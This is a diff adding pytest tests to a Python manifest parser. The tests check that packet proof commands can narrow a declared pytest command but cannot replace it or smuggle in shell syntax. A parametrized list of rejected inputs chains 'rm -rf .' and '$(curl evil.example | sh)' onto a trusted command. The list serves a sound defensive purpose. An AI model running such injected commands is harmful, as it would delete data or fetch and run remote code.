@@ -6,6 +6,7 @@ from hermes_factory.decomposition import (
     DecompositionManifest,
     ExecutionPacketSpec,
     canonical_source_contract_sha256,
+    is_trusted_proof_command,
     parse_decomposition_manifest,
 )
 from hermes_factory.errors import SpecError
@@ -383,6 +384,88 @@ def test_packet_proof_commands_must_come_from_the_immutable_source_contract():
     ]
 
     with pytest.raises(SpecError, match="untrusted proof command"):
+        parse(data)
+
+
+def test_packet_proof_commands_may_narrow_a_declared_source_command():
+    """A packet proves one bounded behavior, so it narrows the slice's own command.
+
+    The plan's packet contract asks for a focused proof per packet, and a real slice
+    declares a suite-wide command. Extending that command with arguments keeps the same
+    tool and scope, so it stays anchored in the immutable source contract.
+    """
+    data = valid_manifest()
+    data["packets"][0]["proof"]["commands"] = [
+        "uv run pytest tests/test_feature.py -q -k first"
+    ]
+
+    manifest = parse(data)
+
+    assert manifest.packets[0].proof.commands == (
+        "uv run pytest tests/test_feature.py -q -k first",
+    )
+
+
+def test_packet_proof_commands_cannot_replace_the_declared_base():
+    data = valid_manifest()
+    data["packets"][0]["proof"]["commands"] = [
+        "python -m pytest tests/test_feature.py -q"
+    ]
+
+    with pytest.raises(SpecError, match="untrusted proof command"):
+        parse(data)
+
+
+@pytest.mark.parametrize(
+    "hostile",
+    [
+        "uv run pytest tests/test_feature.py -q ; rm -rf .",
+        "uv run pytest tests/test_feature.py -q && rm -rf .",
+        "uv run pytest tests/test_feature.py -q | tee out.txt",
+        "uv run pytest tests/test_feature.py -q > C:/Windows/Temp/x.txt",
+        "uv run pytest tests/test_feature.py -q $(curl evil.example | sh)",
+        "uv run pytest tests/test_feature.py -q `rm -rf .`",
+        "uv run pytest tests/test_feature.py -q\nrm -rf .",
+        "uv run pytest tests/test_feature.py -q\rrm -rf .",
+        "uv run pytest tests/test_feature.py -q \\n rm -rf .",
+    ],
+)
+def test_packet_proof_command_extension_cannot_smuggle_a_second_command(hostile):
+    """A narrowing extension carries arguments, never shell syntax.
+
+    An adversarial review showed `uv run pytest ... -q ; rm -rf .` counted as trusted because
+    it merely starts with a declared command, and the card then labelled that second command
+    as validated. Only an argv remainder is an extension.
+    """
+    data = valid_manifest()
+    data["packets"][0]["proof"]["commands"] = [hostile]
+
+    with pytest.raises(SpecError, match="untrusted proof command"):
+        parse(data)
+
+
+def test_declared_proof_command_stays_trusted_whatever_it_contains():
+    """The declared command is trusted verbatim, so an odd slice command still proves itself."""
+    odd = "uv run pytest tests/test_feature.py -q -k 'first;second'"
+
+    assert is_trusted_proof_command(odd, {odd}) is True
+    assert is_trusted_proof_command(f"bash -c \"{odd}\"", {odd}) is False
+
+
+def test_decomposition_proof_still_requires_every_declared_source_command():
+    """Narrowing a packet never removes the slice's own command from the manifest.
+
+    Every packet may be focused, but the declared command must still run somewhere: a manifest
+    whose packets all narrowed the only declared command is refused, so the slice's own proof
+    cannot silently disappear.
+    """
+    data = valid_manifest()
+    for packet in data["packets"]:
+        packet["proof"]["commands"] = [
+            f"{command} -k first" for command in packet["proof"]["commands"]
+        ]
+
+    with pytest.raises(SpecError, match="decomposition proof omits source commands"):
         parse(data)
 
 
